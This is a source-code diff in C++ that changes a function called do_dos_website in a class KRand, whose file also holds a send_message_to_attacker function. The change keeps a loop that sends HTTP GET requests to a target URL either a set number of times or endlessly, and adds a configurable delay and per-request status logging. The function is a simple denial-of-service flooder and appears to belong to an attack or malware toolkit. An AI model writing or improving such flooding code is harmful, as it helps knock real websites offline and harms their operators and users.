@@ -418,23 +418,21 @@ void KRand::send_message_to_attacker(const std::string &attacker_ip, int attacke
 #endif
 }
 
-void KRand::do_dos_website(const std::string &target_url, bool loop, int count) {
-    
+void KRand::do_dos_website(const std::string &target_url, bool loop, int count, int delay_ms) {
     if (!loop) {
         for (int i = 0; i < count; i++) {
             cpr::Response r = cpr::Get(cpr::Url{target_url});
-            std::cout << "." << std::flush;
-            
+            std::cout << "Request " << i + 1 << " - Status: " << r.status_code << std::endl;
+            std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms)); // Add delay
         }
-    } else {  
+    } else {
+        int request_count = 0;
         while (true) {
             cpr::Response r = cpr::Get(cpr::Url{target_url});
-            std::cout << "." << std::flush;
-            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // 100ms delay
+            std::cout << "Request " << ++request_count << " - Status: " << r.status_code << std::endl;
+            std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms)); // Add delay
         }
-
     }
 }
-
 
 
